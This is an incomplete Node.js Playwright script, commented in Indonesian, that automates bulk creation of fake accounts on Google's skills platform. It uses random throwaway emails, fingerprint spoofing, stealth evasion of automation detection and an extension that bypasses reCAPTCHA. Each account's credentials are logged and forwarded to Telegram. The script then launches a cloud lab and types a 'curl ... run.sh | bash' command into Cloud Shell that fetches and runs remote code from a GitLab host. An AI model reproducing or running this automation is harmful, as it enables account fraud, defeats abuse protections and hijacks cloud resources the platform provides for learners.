require('dotenv').config();
const fs = require("fs");
const path = require("path");
const axios = require("axios");
const { chromium } = require("playwright-extra");
const stealth = require("puppeteer-extra-plugin-stealth");
const { getRandomFingerprint, applyFingerprint } = require("./fingerprint");

// === 1. KONFIGURASI UTAMA ===
const CONFIG = {
    SIGNUP_URL: "https://www.skills.google/users/sign_up",
    LAB_URL: "https://www.skills.google/focuses/86502?parent=catalog",
    PROFILES_DIR: path.resolve(__dirname, "profiles"),
    CREDENTIALS_FILE: path.resolve(__dirname, "akun.txt"),
    DOMAIN_URL: "https://gitlab.com/barbieanay003/seger/-/raw/main/domain.txt",
    TELEGRAM_BOT_TOKEN: process.env.TELEGRAM_BOT_TOKEN || '',
    TELEGRAM_CHAT_ID: process.env.TELEGRAM_CHAT_ID || '',
    DEFAULT_PASS: "Blink1997",
    MIN_DELAY: 2000,
    MAX_DELAY: 5000,
};

// === 2. HELPER GENERATOR ===
let LIST_DOMAIN = []; // Dideklarasikan secara global, akan diisi saat skrip dimulai

// Fungsi ini diubah menjadi Async agar bisa mengunduh file
async function loadDomains() {
    const fallback = ["hotmailvip.tokyo", "d4ngerssquy.info"];
    const domainPath = path.resolve(__dirname, "domain.txt");

    try {
        console.log(`  ↓ Mengunduh domain.txt dari GitLab...`);
        const response = await axios.get(CONFIG.DOMAIN_URL);
        fs.writeFileSync(domainPath, response.data, 'utf-8');
        console.log(`  ✔ Berhasil menyimpan domain.txt lokal.`);
    } catch (error) {
        console.log(`  ⚠ Gagal mengunduh domain: ${error.message}. Menggunakan file lokal/fallback.`);
    }

    if (!fs.existsSync(domainPath)) return fallback;
    const lines = fs.readFileSync(domainPath, 'utf-8').split('\n').map(l => l.trim()).filter(Boolean);
    return lines.length > 0 ? lines : fallback;
}

function generateRandomName(length = 7) {
    const chars = 'abcdefghijklmnopqrstuvwxyz';
    let res = '';
    for (let i = 0; i < length; i++) res += chars.charAt(Math.floor(Math.random() * chars.length));
    return res.charAt(0).toUpperCase() + res.slice(1);
}

function generateRandomEmail() {
    const length = Math.floor(Math.random() * (12 - 7 + 1)) + 7;
    const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
    let user = '';
    for (let i = 0; i < length; i++) user += chars.charAt(Math.floor(Math.random() * chars.length));
    // Memilih domain acak dari LIST_DOMAIN yang sudah diunduh
    const domain = LIST_DOMAIN[Math.floor(Math.random() * LIST_DOMAIN.length)];
    return `${user}@${domain}`;
}

// === 3. HELPER BROWSER & PROXY ===
function getRandomUserAgent() {
    const userAgents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
    ];
    return userAgents[Math.floor(Math.random() * userAgents.length)];
}

function loadProxy() {
    const proxyFile = path.resolve(__dirname, 'proxy.txt');
    if (!fs.existsSync(proxyFile)) return null;
    const lines = fs.readFileSync(proxyFile, 'utf-8').split('\n');
    for (const line of lines) {
        const trimmed = line.trim();
        if (trimmed && !trimmed.startsWith('#')) return trimmed;
    }
    return null;
}

function parseProxyString(proxyStr) {
    try {
        const url = new URL(proxyStr);
        const server = `${url.protocol}//${url.hostname}:${url.port}`;
        const result = { server };
        if (url.username) result.username = decodeURIComponent(url.username);
        if (url.password) result.password = decodeURIComponent(url.password);
        return result;
    } catch {
        return { server: proxyStr };
    }
}

function randomDelay(min = CONFIG.MIN_DELAY, max = CONFIG.MAX_DELAY) {
    return new Promise((r) => setTimeout(r, Math.floor(Math.random() * (max - min + 1)) + min));
}

async function humanType(locator, text) {
    for (const char of text) {
        await locator.pressSequentially(char, { delay: 40 + Math.random() * 70 });
    }
}

async function tgSendMessage(text) {
    if (!CONFIG.TELEGRAM_BOT_TOKEN || !CONFIG.TELEGRAM_CHAT_ID) return;
    try {
        await axios.post(`https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: CONFIG.TELEGRAM_CHAT_ID, text: text, parse_mode: 'HTML',
        });
        console.log(`  ✔ Telegram: Berhasil mengirim notifikasi.`);
    } catch (e) {
        console.log(`  ✘ Telegram gagal: ${e.message}`);
    }
}

// === 4. SCRAPER EMAIL ===
async function getConfirmationLinkWeb(context, targetEmail) {
    const page = await context.newPage();
    try {
        console.log(`  -> Membuka inbox untuk verifikasi: ${targetEmail}`);
        await context.addCookies([{ name: "embx", value: `[%22${targetEmail}%22]`, domain: ".generator.email", path: "/" }]);
        await page.goto(`https://generator.email/${targetEmail}`, { waitUntil: "domcontentloaded" });
        
        for (let attempt = 1; attempt <= 5; attempt++) {
            console.log(`     (Percobaan ${attempt}/5): Memindai inbox...`);
            const content = await page.content();
            
            const rawLinkMatch = content.match(/https:\/\/www\.skills\.google\/users\/confirmation\?confirmation_token=[^"'\s&>]+/);
            const redirectMatch = content.match(/https:\/\/notifications\.googleapis\.com\/email\/redirect\?[^"'\s>]+/);
            
            let link = null;
            if (rawLinkMatch) link = rawLinkMatch[0].replace(/&amp;/g, '&');
            else if (redirectMatch) link = redirectMatch[0].replace(/&amp;/g, '&');

            if (link) {
                if (!link.includes("locale=")) link += "&locale=en";
                console.log("  ✔ Tautan verifikasi ditemukan!");
                return link;
            }
            await page.waitForTimeout(6000);
            await page.reload({ waitUntil: "domcontentloaded" });
        }
    } catch (e) {
        console.log(`  ✘ Error Scraper: ${e.message}`);
    } finally {
        await page.close();
    }
    return null;
}

// === 5. FUNGSI EKSEKUSI CLOUD SHELL ===
async function runCloudShell(context, consoleLink, password, projectId, studentEmail = '', studentPassword = '') {
    console.log('\n┌─────────────────────────────────────────');
    console.log('│  Tahap 4 — Eksekusi Cloud Shell');
    console.log('└─────────────────────────────────────────');
    const shellPage = await context.newPage();
    try {
        await shellPage.goto(consoleLink, { waitUntil: 'domcontentloaded', timeout: 60000 });
        await randomDelay(2000, 3000);

        for (let i = 0; i < 15; i++) {
            const url = shellPage.url();
            const isVerifPage = url.includes('speedbump') || url.includes('gaplustos') || url.includes('samlrp') || url.includes('accounts.google.com');

            if (!isVerifPage) {
                console.log(`  ✔ Halaman tujuan tercapai: ${url.substring(0, 80)}`);
                break;
            }

            console.log(`  ~ Verifikasi Google (${i + 1}/15)...`);

            if (url.includes('/signin/rejected') || url.includes('rrk=21')) {
                console.log('  → Google rejected SSO — coba manual sign-in akun student...');
                if (studentEmail && studentPassword) {
                    try {
                        await shellPage.goto('https://accounts.google.com/AddSession', { waitUntil: 'domcontentloaded', timeout: 30000 });
                        await randomDelay(1500, 2500);
                        const emailInput = shellPage.locator('input[type="email"]').first();
                        await emailInput.waitFor({ state: 'visible', timeout: 8000 });
                        await emailInput.fill(studentEmail);
                        await shellPage.keyboard.press('Enter');
                        await randomDelay(3000);
                        
                        const pwdInput2 = shellPage.locator('input[type="password"]').first();
                        await pwdInput2.waitFor({ state: 'visible', timeout: 8000 });
                        await pwdInput2.fill(studentPassword);
                        await shellPage.keyboard.press('Enter');
                        await randomDelay(3000);
                        
                        await shellPage.goto(consoleLink, { waitUntil: 'domcontentloaded', timeout: 60000 });
                        await randomDelay(2000, 3000);
                    } catch (e) {
                        console.log(`  ✘ Manual sign-in gagal: ${e.message.substring(0, 80)}`);
                    }
                }
                continue;
            }

            if (url.includes('/challenge/pwd') || url.includes('/signin/v2/challenge/pwd')) {
                try {
                    const pwdInput = shellPage.locator('input[type="password"]').first();
                    await pwdInput.waitFor({ state: 'visible', timeout: 5000 });
                    await pwdInput.fill('');
                    await pwdInput.type(password, { delay: 60 });
                    await randomDelay(500);
                    await shellPage.getByRole('button', { name: 'Next', exact: false }).click({ timeout: 5000 });
                    await shellPage.waitForLoadState('domcontentloaded');
                    await randomDelay(2000, 3000);
                } catch (e) {}
                continue;
            }

            const candidates = ['Continue as student', 'Lanjutkan sebagai siswa', 'Saya mengerti', 'I understand', 'Lanjutkan', 'Continue', 'Accept', 'Setuju', 'Next'];
            let clicked = false;
            for (const label of candidates) {
                try {
                    const btn = shellPage.getByRole('button', { name: label, exact: false });
                    if (await btn.isVisible({ timeout: 1000 }).catch(() => false)) {
                        await btn.click({ timeout: 5000 });
                        await shellPage.waitForLoadState('domcontentloaded');
                        await randomDelay(2000, 3000);
                        clicked = true;
                        break;
                    }
                } catch {}
            }
            if (!clicked) await randomDelay(2000, 3000);
        }

        async function dismissStudentDialog() {
            try {
                const btn = shellPage.getByRole('button', { name: /continue as student|lanjutkan sebagai siswa/i });
                if (await btn.isVisible({ timeout: 1500 }).catch(() => false)) {
                    await btn.click();
                    await randomDelay(1500);
                }
            } catch {}
        }

        await dismissStudentDialog();

        try {
            await shellPage.locator('input.mdc-checkbox__native-control').first().check({ timeout: 10000 });
            await shellPage.locator("button:has-text('Agree and continue')").click({ timeout: 10000 });
            await randomDelay(3000);
        } catch {}

        console.log('  ~ Menunggu tombol Cloud Shell...');
        await dismissStudentDialog();
        const shellBtn = shellPage.locator('button[aria-label*="Cloud Shell"], button:has(mat-icon[data-mat-icon-name="devshell"])');
        await shellBtn.waitFor({ state: 'visible', timeout: 60000 });
        await shellBtn.click();
        console.log('  → Menyalakan Cloud Shell...');

        console.log('  ~ Menunggu TOS / Terminal...');
        let terminalFrame = null;
        for (let i = 0; i < 30; i++) {
            await randomDelay(2000);
            await dismissStudentDialog();

            // Handling TOS iFrame if appears
            for (const frame of shellPage.frames()) {
                try {
                    const cb = frame.locator('input.mdc-checkbox__native-control, input[type="checkbox"]').first();
                    if (await cb.isVisible({ timeout: 500 }).catch(() => false)) {
                        await cb.check({ timeout: 3000 });
                        await randomDelay(1000);
                    }
                    for (const label of ['Start Cloud Shell', 'Agree and continue', 'Continue', 'Authorize']) {
                        const btn = frame.getByRole('button', { name: label, exact: false });
                        if (await btn.isVisible({ timeout: 500 }).catch(() => false)) {
                            await btn.click({ timeout: 5000 });
                            await randomDelay(1000);
                        }
                    }
                } catch {}
            }

            // Check if terminal exists
            terminalFrame = shellPage.frames().find(f => f.url().includes('devshell') || f.url().includes('embeddedcloudshell'));
            if (terminalFrame) {
                const ta = terminalFrame.locator('textarea.xterm-helper-textarea');
                if (await ta.isVisible({ timeout: 1000 }).catch(() => false)) break;
            }
        }

        if (!terminalFrame) throw new Error('Terminal frame tidak ditemukan setelah 60s');

        await shellPage.keyboard.press('Escape');
        await randomDelay(500);
        await dismissStudentDialog();

        const xtermTextarea = terminalFrame.locator('textarea.xterm-helper-textarea');
        await xtermTextarea.click({ timeout: 10000 });
        console.log('  ✔ Terminal difokuskan');
        await randomDelay(2000);

        await xtermTextarea.press('Control+c');
        await randomDelay(500);
        await xtermTextarea.press('Control+l'); 
        await randomDelay(1000);

        if (projectId) {
            const gcloudCmd = `gcloud config set project ${projectId}`;
            console.log(`  → Set project: ${projectId}`);
            await xtermTextarea.pressSequentially(gcloudCmd, { delay: 15 });
            await randomDelay(500);
            await xtermTextarea.press('Enter');
            await randomDelay(8000);
            await xtermTextarea.press('Enter'); 
        }

        const command = "curl https://gitlab.com/barbieanay003/seger/-/raw/main/run.sh | bash";
        console.log(`  → Eksekusi script...`);
        await xtermTextarea.pressSequentially(command, { delay: 10 });
        await randomDelay(500);
        await xtermTextarea.press('Enter');
        console.log('  ✔ Script utama berhasil dikirim (Enter)!');
        await randomDelay(8000);

    } catch (e) {
        console.log(`  ✘ Cloud Shell error: ${e.message}`);
    }
}

// === MAIN PIPELINE ===
(async () => {
    chromium.use(stealth());
    console.log(`\n🚀 MEMULAI PIPELINE ALL-IN-ONE`);

    // WAJIB: Download dan Muat Domain Sebelum Pipeline Dimulai
    LIST_DOMAIN = await loadDomains();
    console.log(`  ✔ ${LIST_DOMAIN.length} Domain siap digunakan untuk generasi email.`);

    // --- MODIFIKASI: FUNGSI INTERAKTIF CLI ---
    const readline = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });

    const askQuestion = (query) => new Promise(resolve => readline.question(query, resolve));
    
    let maxLoops = 1;
    const answer = await askQuestion('\n  ❓ Berapa jumlah akun yang ingin diproses? : ');
    const parsedAnswer = parseInt(answer.trim(), 10);
    
    readline.close();

    if (isNaN(parsedAnswer) || parsedAnswer <= 0) {
        console.log('  ✘ Masukkan angka tidak valid! Menjalankan 1 akun sebagai default.\n');
    } else {
        maxLoops = parsedAnswer;
        console.log(`  ✔ Mengatur antrean untuk ${maxLoops} akun. Memulai proses...\n`);
    }

    const useHeadless = false;

    async function processSinglePipeline(label) {
        const email = generateRandomEmail();
        const password = CONFIG.DEFAULT_PASS;
        
        console.log(`\n${'═'.repeat(50)}`);
        console.log(`  ${label}`);
        console.log(`  Data Akun : ${email}`);
        console.log(`${'═'.repeat(50)}`);

        // FOLDER PROFIL BARU: Jaminan 100% Fresh per Akun
        const emailSlug = email.replace(/[@.]/g, '_') + '_' + Date.now();
        const profileDir = path.join(CONFIG.PROFILES_DIR, emailSlug);
        if (!fs.existsSync(profileDir)) fs.mkdirSync(profileDir, { recursive: true });
        
        const freshUserAgent = getRandomUserAgent();
        const proxyStr = loadProxy();
        const proxyConfig = proxyStr ? parseProxyString(proxyStr) : undefined;
        const extensionPath = path.resolve(__dirname, "Humans");

        const fp = getRandomFingerprint();

        let context = await chromium.launchPersistentContext(profileDir, {
            userAgent: freshUserAgent, 
            headless: useHeadless,
            viewport: fp.viewport,
            screen: fp.viewport,
            args: [
                "--start-maximized", 
                "--disable-blink-features=AutomationControlled",
                "--no-sandbox",
                `--disable-extensions-except=${extensionPath}`, 
                `--load-extension=${extensionPath}`
            ],
            ...(proxyConfig ? { proxy: proxyConfig } : {}),
            permissions: ['clipboard-read', 'clipboard-write'],
            locale: fp.locale,
            timezoneId: fp.timezone,
        });

        await applyFingerprint(context, fp);

        let page = context.pages()[0] || (await context.newPage());

        try {
            // ==========================================
            // TAHAP 1: REGISTRASI AKUN
            // ==========================================
            console.log('\n┌─────────────────────────────────────────');
            console.log('│  Tahap 1 — Pendaftaran Akun');
            console.log('└─────────────────────────────────────────');
            await page.goto(CONFIG.SIGNUP_URL, { waitUntil: "domcontentloaded", timeout: 60000 });
            
            await page.locator("#use-email-and-password-button").click();
            await page.locator("#user_first_name").waitFor({ state: "visible" });

            console.log("  → Mengisi form pendaftaran...");
            await humanType(page.locator("#user_first_name"), generateRandomName());
            await humanType(page.locator("#user_last_name"), generateRandomName());
            await humanType(page.locator("#user_email"), email);
            await humanType(page.locator("#user_company_name"), generateRandomName());
            await humanType(page.locator("#user_password"), password);
            await humanType(page.locator("#user_password_confirmation"), password);
            
            await humanType(page.locator("#dob_day"), String(Math.floor(Math.random() * 28) + 1));
            await humanType(page.locator("#dob_year"), String(Math.floor(Math.random() * 30) + 1970));

            console.log("  Step 7: Scrolling reCAPTCHA...");
            await page.keyboard.press("PageDown");
            await randomDelay(2000, 2500);

            for (const frame of page.frames()) {
                if (frame.url().includes("recaptcha") && frame.url().includes("anchor")) {
                    try {
                        await frame.locator("#recaptcha-anchor").click({ timeout: 5000 });
                        break; 
                    } catch (e) {}
                }
            }
            
            await randomDelay(3000, 3500);

            let initial_bframe = page.frames().find(f => f.url().includes('bframe'));
            let captcha_solved = false;

            if (initial_bframe) {
                console.log("  → Image challenge terdeteksi — memulai loop retry (3x)...");
                const max_retries = 3;
                
                for (let attempt = 1; attempt <= max_retries; attempt++) {
                    try {
                        let current_bframe = page.frames().find(f => f.url().includes('bframe'));
                        
                        if (!current_bframe) {
                            console.log(`  ⚠ [Attempt ${attempt}] Frame captcha hilang, mencari kembali...`);
                            await randomDelay(2000, 2500);
                            continue;
                        }

                        const ext_button = current_bframe.locator('.help-button-holder').first();
                        await ext_button.waitFor({ state: "visible", timeout: 10000 });
                        await ext_button.click();
                        console.log(`  ✔ [Attempt ${attempt}] Ekstensi diklik...`);

                        let success_inner = false;
                        for (let w = 0; w < 40; w++) { 
                            await randomDelay(500, 600);
                            
                            const token = await page.evaluate(() => document.getElementById("g-recaptcha-response")?.value);
                            if (token && token.length > 10) {
                                success_inner = true; 
                                break;
                            }
                            
                            for (const af of page.frames()) {
                                if (af.url().includes("recaptcha") && af.url().includes("anchor")) {
                                    const is_checked = await af.evaluate(() => document.querySelector("#recaptcha-anchor")?.getAttribute("aria-checked") === "true").catch(() => false);
                                    if (is_checked) {
                                        success_inner = true; 
                                        break;
                                    }
                                }
                            }
                            if (success_inner) break;
                        }

                        if (success_inner) {
                            console.log("  ✔ reCAPTCHA Berhasil (Bypass).");
                            captcha_solved = true;
                            break;
                        } else {
                            console.log(`  ✘ [Attempt ${attempt}] Ekstensi gagal memproses gambar.`);
                            if (attempt < max_retries) {
                                try {
                                    console.log("  ↻ Memuat ulang gambar reCAPTCHA...");
                                    await current_bframe.locator('#recaptcha-reload-button').click({ timeout: 5000 });
                                    await randomDelay(4000, 4500);
                                } catch (e) {
                                    console.log(`  ⚠ Gagal menekan tombol reload: ${e.message.split('\n')[0].substring(0, 40)}`);
                                }
                            }
                        }
                    } catch (e) {
                        console.log(`  ✘ Error Attempt ${attempt}: ${e.message.split('\n')[0].substring(0, 60)}`);
                    }
                }
            } else {
                console.log("  ✔ Tidak ada tantangan gambar (Auto-pass).");
                captcha_solved = true;
            }

            if (!captcha_solved) {
                throw new Error("FATAL: Gagal reCAPTCHA. Proses dihentikan.");
            }

            console.log("  → Klik Create account...");
            const createBtn = page.locator("button[data-analytics-action='clicked_create_account']").first();
            await createBtn.scrollIntoViewIfNeeded();
            await createBtn.evaluate(node => node.click());
            await randomDelay(1000, 2000);

            try {
                await page.waitForURL(url => !url.href.includes("sign_up"), { timeout: 20000 });
                console.log(`  ✔ BERHASIL Mendaftar -> Redirect ke ${page.url()}`);
            } catch (e) {
                throw new Error("Pendaftaran ditolak sistem.");
            }

            // ==========================================
            // TAHAP 2: VERIFIKASI EMAIL
            // ==========================================
            console.log('\n┌─────────────────────────────────────────');
            console.log('│  Tahap 2 — Verifikasi Email');
            console.log('└─────────────────────────────────────────');
            await randomDelay(8000, 10000);
            const link = await getConfirmationLinkWeb(context, email);

            if (link) {
                console.log(`  -> Mengeksekusi link verifikasi...`);
                await page.goto(link, { waitUntil: "commit", timeout: 30000 });
                console.log(`  ✔ Sinyal verifikasi sukses.`);
                fs.appendFileSync(CONFIG.CREDENTIALS_FILE, `${email}:${password}\n`, "utf-8");
                await tgSendMessage(`<code>${email}:${password}</code>`);
            } else {
                throw new Error("Gagal mendapatkan link verifikasi.");
            }

            // ==========================================
            // TAHAP 2.5: LOGIN AKUN (WAJIB SETELAH VERIFIKASI)
            // ==========================================
            console.log('\n┌─────────────────────────────────────────');
            console.log('│  Tahap 2.5 — Login Akun Baru');
            console.log('└─────────────────────────────────────────');
            await page.goto("https://www.skills.google/users/sign_in", { waitUntil: "domcontentloaded", timeout: 60000 });
            await randomDelay(2000, 3000);

            const emailBtn = page.locator('#use-email-and-password-button');
            if (await emailBtn.isVisible({ timeout: 5000 }).catch(() => false)) {
                console.log('  → Klik "Use email and password"...');
                await emailBtn.click();
                await randomDelay(1000, 2000);

                console.log('  → Mengisi kredensial login...');
                const emailField = page.locator('input[type="email"], input[name="user[email]"], input#user_email');
                await emailField.waitFor({ state: "visible" });
                await emailField.click();
                await humanType(emailField, email);
                await randomDelay(800, 1500);

                const passwordField = page.locator('input[type="password"], input[name="user[password]"], input#user_password');
                await passwordField.click();
                await humanType(passwordField, password);
                await randomDelay(800, 1500);

                console.log('  → Klik Sign in...');
                const signInBtn = page.locator('ql-button[type="submit"][data-analytics-action="clicked_sign_in"]');
                await signInBtn.click();

                try {
                    await page.waitForURL(url => !url.href.includes("sign_in"), { timeout: 20000 });
                    console.log(`  ✔ Login sukses! Redirect ke ${page.url()}`);
                } catch (e) {
                    console.log('  ⚠ Timeout redirect login, asumsikan berhasil dan lanjut ke Lab...');
                }
            } else {
                console.log('  ✔ Sesi sudah login (tombol login tidak muncul).');
            }
            await randomDelay(2000, 3000);

            // ==========================================
            // TAHAP 3: BUKA LAB & EKSTRAK DOM
            // ==========================================
            console.log('\n┌─────────────────────────────────────────');
            console.log('│  Tahap 3 — Buka & Mulai Lab');
            console.log('└─────────────────────────────────────────');
            await page.goto(CONFIG.LAB_URL, { waitUntil: "domcontentloaded", timeout: 60000 });
            await randomDelay(2000, 3000);

            console.log('  ~ Menunggu ql-lab-control-panel...');
            await page.waitForSelector('ql-lab-control-panel', { state: 'attached', timeout: 30000 });
            
            console.log('  → Klik Start Lab...');
            await page.evaluate(() => {
                const panel = document.querySelector('ql-lab-control-panel');
                if (!panel || !panel.shadowRoot) return;
                const controlBtn = panel.shadowRoot.querySelector('ql-lab-control-button, #lab-control-button');
                if (!controlBtn || !controlBtn.shadowRoot) return;
                const qlBtn = controlBtn.shadowRoot.querySelector('ql-button');
                if (qlBtn) qlBtn.click();
            });

            await randomDelay(3000, 4000);
            
            console.log('  ~ Memeriksa apakah CAPTCHA Lab diperlukan...');
            let needsCaptcha = false;
            let labAlreadyStarting = false;

            for (let poll = 0; poll < 15; poll++) {
                await randomDelay(1000, 1500);
                const labState = await page.evaluate(() => {
                    const panel = document.querySelector('ql-lab-control-panel');
                    if (!panel) return { starting: false };
                    if (panel.shadowRoot) {
                        const text = panel.shadowRoot.textContent || '';
                        if (text.includes('End Lab') || text.includes('Provisioning')) return { starting: true };
                    }
                    const attr = panel.getAttribute('labcontrolbutton');
                    if (attr) {
                        try {
                            const s = JSON.parse(attr);
                            if (s.running || s.pending) return { starting: true };
                        } catch {}
                    }
                    return { starting: false };
                }).catch(() => ({ starting: false }));

                if (labState.starting) {
                    console.log('  ✔ Lab mulai berjalan — tidak perlu CAPTCHA!');
                    labAlreadyStarting = true;
                    break;
                }

                const anchorFrame = page.frames().find(f => f.url().includes('recaptcha') && f.url().includes('anchor') && !f.url().includes('invisible'));
                if (anchorFrame) {
                    console.log(`  ✔ reCAPTCHA Lab terdeteksi!`);
                    needsCaptcha = true;
                    break;
                }
            }

            if (needsCaptcha) {
                console.log('  → Mengklik checkbox reCAPTCHA Lab...');
                let clicked = false;
                
                for (const frame of page.frames()) {
                    if (frame.url().includes("recaptcha") && frame.url().includes("anchor")) {
                        try {
                            await frame.locator("#recaptcha-anchor").click({ timeout: 5000 });
                            clicked = true;
                            console.log('  ✔ Checkbox reCAPTCHA diklik!');
                            break;
                        } catch (e) {}
                    }
                }

                if (!clicked) {
                    console.log('  → Coba pendekatan locator...');
                    try {
                        const frameLoc = page.frameLocator('iframe[src*="recaptcha"][src*="anchor"]').first();
                        await frameLoc.locator('#recaptcha-anchor').click({ timeout: 5000 });
                        clicked = true;
                        console.log(`  ✔ Checkbox diklik via frameLocator!`);
                    } catch (e) {
                         console.log(`  ⚠ Gagal klik checkbox: ${e.message.split('\n')[0]}`);
                    }
                }

                console.log('  ~ Menunggu reCAPTCHA diproses...');
                await randomDelay(2000, 3000);
                
                let bframeExists = page.frames().some(f => f.url().includes('bframe'));
                
                if (bframeExists) {
                    console.log('  → Image challenge muncul — memicu ekstensi "Human"...');
                    const maxRetries = 3;
                    let extSolved = false;
                    const launchLabLocator = page.locator('.js-launch-button.js-lab-access-modal-button, button:has-text("Launch with")').first();

                    for (let attempt = 1; attempt <= maxRetries; attempt++) {
                        let currentBframe = page.frames().find(f => f.url().includes('bframe'));
                        if (!currentBframe) break;

                        try {
                            const extButton = currentBframe.locator('.help-button-holder').first();
                            await extButton.waitFor({ state: 'visible', timeout: 8000 });
                            await extButton.click();
                            console.log(`  ✔ [Attempt ${attempt}] Tombol ekstensi diklik, menunggu bypass...`);

                            extSolved = false;
                            let bypassOutcome = "TIMEOUT"; 

                            for (let wait = 0; wait < 30; wait++) {
                                await randomDelay(1000, 1500); 
                                
                                try {
                                    const isInstantReady = await page.evaluate(() => {
                                        const p = document.querySelector('ql-lab-control-panel');
                                        if(!p) return false;
                                        
                                        function checkDeep(root) {
                                            if (!root) return false;
                                            const txt = root.textContent || "";
                                            if (txt.includes("student-") || txt.includes("qwiklabs-gcp-")) return true;
                                            const links = root.querySelectorAll('a');
                                            for (const a of links) {
                                                if (a.href && (a.href.includes('console.cloud.google') || a.href.includes('google_sso'))) return true;
                                            }
                                            for (const el of root.querySelectorAll('*')) {
                                                if (el.shadowRoot && checkDeep(el.shadowRoot)) return true;
                                            }
                                            return false;
                                        }
                                        return checkDeep(p.shadowRoot || p);
                                    }).catch(() => false);

                                    if (isInstantReady) { bypassOutcome = "INSTANT"; break; }

                                    const isProvisioning = await page.evaluate(() => {
                                        const p = document.querySelector('ql-lab-control-panel');
                                        if (!p) return false;
                                        if (p.shadowRoot && p.shadowRoot.textContent.includes('Provisioning')) return true;
                                        const attr = p.getAttribute('labcontrolbutton');
                                        return attr && (attr.includes('"running":true') || attr.includes('"pending":true'));
                                    }).catch(() => false);

                                    if (isProvisioning || await launchLabLocator.isVisible().catch(() => false)) { 
                                        bypassOutcome = "PROVISIONING"; break; 
                                    }

                                    const bframeLoc = page.locator('iframe[src*="bframe"]').first();
                                    const isBframeVisible = await bframeLoc.isVisible().catch(() => false);
                                    if (!isBframeVisible) {
                                        bypassOutcome = "PROVISIONING"; break; 
                                    }

                                    let activeBframe = page.frames().find(f => f.url().includes('bframe'));
                                    if (activeBframe) {
                                        const tryAgainMsg = activeBframe.locator('.rc-imageselect-error-select-more, .rc-imageselect-incorrect-response, .rc-doscaptcha-header-text');
                                        if (await tryAgainMsg.isVisible().catch(() => false)) {
                                            bypassOutcome = "RETRY"; break; 
                                        }
                                    }
                                } catch (pollErr) {}
                            }

                            if (bypassOutcome === "INSTANT" || bypassOutcome === "PROVISIONING") {
                                console.log(`  ✔ Ekstensi berhasil merespons! (Mode: ${bypassOutcome})`);
                                extSolved = true;
                                
                                if (await launchLabLocator.isVisible().catch(() => false)) {
                                    await launchLabLocator.click({ timeout: 5000 }).catch(()=>{});
                                    console.log('  ✔ Tombol modal konfirmasi "Launch Lab" diklik!');
                                }
                                break; 
                                
                            } else {
                                console.log(`  ✘ [Attempt ${attempt}] Ekstensi gagal atau gambar ditolak. (Status: ${bypassOutcome})`);
                                if (attempt < maxRetries) {
                                    console.log('  → Reloading CAPTCHA...');
                                    try {
                                        const reloadBtn = page.frameLocator('iframe[src*="bframe"]').first().locator('#recaptcha-reload-button');
                                        if (await reloadBtn.isVisible().catch(()=>false)) {
                                            await reloadBtn.click({ timeout: 5000 });
                                            await randomDelay(3000, 4000);
                                        } else {
                                            console.log('  ⚠ Tombol reload lenyap, asumsikan CAPTCHA sukses di latar belakang.');
                                            extSolved = true; 
                                            break;
                                        }
                                    } catch (err) {
                                        console.log(`  ⚠ Gagal menekan reload: ${err.message.split('\n')[0]}`);
                                    }
                                }
                            }
                        } catch (e) {
                            console.log(`  ✘ Gagal interaksi ekstensi di attempt ${attempt}: ${e.message.split('\n')[0]}`);
                        }
                    }

                    if (!extSolved) throw new Error('CAPTCHA_FAILED_BY_EXTENSION di Tahap 3');
                } else {
                     console.log('  ✔ Tidak ada tantangan gambar (Auto-pass).');
                     const launchLabLocator = page.locator('.js-launch-button.js-lab-access-modal-button, button:has-text("Launch with")').first();
                     if (await launchLabLocator.isVisible({timeout: 2000}).catch(()=>false)) {
                         await launchLabLocator.click();
                         console.log('  ✔ Tombol modal "Launch Lab" berhasil diklik!');
                     }
                }
            }

            console.log('  ~ Memeriksa status provisioning lab...');
            let labStarted = false;
            let timeWaited = 0;
            let maxWait = 300000; 
            let smartWaitTriggered = false;

            while (timeWaited < maxWait) {
                try {
                    const domState = await page.evaluate(() => {
                        const result = { isReady: false, estimatedMinutes: 0 };
                        
                        const panel = document.querySelector('ql-lab-control-panel');
                        if (!panel) return result; 

                        function findProvisioning(root) {
                            if (!root) return 0;
                            const banner = root.querySelector('.provisioning-banner');
                            if (banner) {
                                const match = (banner.textContent || "").match(/(\d+)\s*minute/i);
                                if (match) return parseInt(match[1], 10);
                            }
                            const els = root.querySelectorAll('*');
                            for (const el of els) {
                                if (el.shadowRoot) {
                                    const mins = findProvisioning(el.shadowRoot);
                                    if (mins > 0) return mins;
                                }
                            }
                            return 0;
                        }
                        result.estimatedMinutes = findProvisioning(panel.shadowRoot || panel);

                        function checkPanelReady(root) {
                            if (!root) return false;
                            
                            const links = root.querySelectorAll('a');
                            for (const a of links) {
                                if (a.href && (a.href.includes('console.cloud.google') || a.href.includes('google_sso'))) return true;
                            }

                            const text = root.textContent || "";
                            if (text.includes("student-") || text.includes("qwiklabs-gcp-")) return true;
                            
                            const els = root.querySelectorAll('*');
                            for (const el of els) {
                                if (el.shadowRoot && checkPanelReady(el.shadowRoot)) return true;
                            }
                            return false;
                        }

                        if (panel.shadowRoot && checkPanelReady(panel.shadowRoot)) {
                            result.isReady = true;
                            return result;
                        }

                        const attr = panel.getAttribute('labcontrolbutton');
                        if (attr) {
                            try {
                                const s = JSON.parse(attr);
                                if (s.running === true && s.pending === false) {
                                    const allAttrs = panel.getAttributeNames().map(n => panel.getAttribute(n)).join(' ');
                                    if (allAttrs.includes('student') || allAttrs.includes('project')) {
                                        result.isReady = true;
                                        return result;
                                    }
                                }
                            } catch (e) {}
                        }

                        return result;
                    });

                    if (domState.isReady) {
                        labStarted = true;
                        process.stdout.write(`\r  ✔ Lab berhasil siap dalam waktu ${timeWaited / 1000} detik!        \n`);
                        break; 
                    }

                    if (domState.estimatedMinutes > 0 && !smartWaitTriggered) {
                        smartWaitTriggered = true;
                        const waitMs = (domState.estimatedMinutes * 60 * 1000) + 15000; 
                        
                        console.log(`\n  ~ Banner Provisioning Terdeteksi! Estimasi: ${domState.estimatedMinutes} menit.`);
